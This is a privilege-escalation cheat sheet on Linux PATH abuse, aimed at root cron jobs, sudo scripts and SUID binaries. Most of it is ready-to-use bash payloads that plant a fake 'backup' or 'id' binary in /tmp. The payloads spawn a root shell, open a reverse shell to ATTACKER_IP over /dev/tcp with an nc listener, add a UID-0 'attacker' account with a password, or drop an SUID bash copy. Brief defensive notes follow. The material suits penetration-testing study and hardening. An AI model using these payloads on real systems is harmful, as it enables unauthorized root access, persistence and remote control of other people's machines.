# PATH Abuse

## Technique Overview

PATH abuse occurs when a privileged process executes a command
without using its absolute path (e.g., `cp` instead of `/bin/cp`).

If a writable directory appears earlier in `$PATH`, an attacker can
place a malicious binary with the same name as the intended command,
causing the system to execute the attacker-controlled file.

This commonly appears in:

- Root cron jobs
- Sudo-allowed scripts
- Custom services
- SUID binaries calling external commands

# Payloads

---

## Simple Root Shell Drop

Create malicious binary matching executed command name:

```bash
echo '#!/bin/bash' > /tmp/backup
echo '/bin/bash -p' >> /tmp/backup
chmod +x /tmp/backup
```

Condition:
- `/tmp` is in PATH
- Root executes `backup`

---

## Reverse Shell

```bash
echo '#!/bin/bash' > /tmp/backup
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /tmp/backup
chmod +x /tmp/backup
```

Start listener:

```bash
nc -lvnp 4444
```

---

## Add Root User (Persistent Access)

```bash
echo '#!/bin/bash' > /tmp/backup
echo 'useradd -o -u 0 -g 0 attacker' >> /tmp/backup
echo 'echo attacker:password | chpasswd' >> /tmp/backup
chmod +x /tmp/backup
```

---

## SUID Shell Drop

```bash
echo '#!/bin/bash' > /tmp/backup
echo 'cp /bin/bash /tmp/rootbash' >> /tmp/backup
echo 'chmod +s /tmp/rootbash' >> /tmp/backup
chmod +x /tmp/backup
```

Then execute:

```bash
/tmp/rootbash -p
```

---

## PATH Injection via sudo -E

If environment variables are preserved:

```bash
export PATH=/tmp:$PATH
```

Create malicious binary:

```bash
echo '#!/bin/bash' > /tmp/id
echo '/bin/bash -p' >> /tmp/id
chmod +x /tmp/id
```

Trigger sudo-executed script.

---

# Defensive Notes

- Always use absolute paths in privileged scripts
- Remove writable directories from PATH
- Disable environment inheritance in sudo
- Audit cron and service configurations

---

# Risk Level

High — results in direct privilege escalation  
Low complexity if misconfiguration exists
